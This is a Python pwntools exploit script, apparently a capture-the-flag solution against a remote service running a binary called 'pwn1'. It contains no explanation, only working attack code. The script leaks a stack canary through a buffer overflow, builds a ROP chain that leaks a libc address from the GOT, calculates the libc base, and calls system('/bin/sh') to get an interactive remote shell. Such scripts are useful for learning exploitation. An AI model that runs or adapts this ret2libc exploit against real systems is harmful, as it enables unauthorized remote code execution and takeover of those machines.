from pwn import *
context.log_level = 'debug'

r = remote('111.198.29.45', 44447)
#r = process('./pwn1')
elf = ELF('./pwn1')
libc = ELF('./libc-2.23.so')

pop_rdi = 0x0000000000400a93
main = 0x400908
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc_puts = libc.sym['puts']
system = libc.sym['system']
binsh = libc.search("/bin/sh").next()

print hex(system)
print hex(binsh)

def read_puts(payload):
    r.recvuntil(">>")
    r.sendline("1")
    r.send(payload)
    r.recvuntil(">>")
    r.sendline("2")

payload = 'A'*(0x90-8) + 'b'
read_puts(payload)
r.recvuntil("Ab")
canary = u64(r.recv(7).rjust(8, '\x00'))
print hex(canary)

payload = 'A'*(0x90-8) + p64(canary) + 'aaaaaaaa' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
read_puts(payload)
r.recvuntil(">>")
r.sendline("3")
r.recv(1)
puts_addr = u64(r.recvuntil('\x7f').ljust(8, '\x00'))
#puts_addr = u64(r.recvuntil("\n").split('\n')[00].ljust(8, '\x00'))
print hex(puts_addr)

base = puts_addr-libc_puts
print(base)
system += base
binsh += base + 2 + 0x3e

payload = 'A'*(0x90-8) + p64(canary) + 'aaaaaaaa'+ p64(pop_rdi) + p64(binsh) + p64(system)
read_puts(payload)
r.recvuntil(">>")
r.sendline("3")

r.interactive()
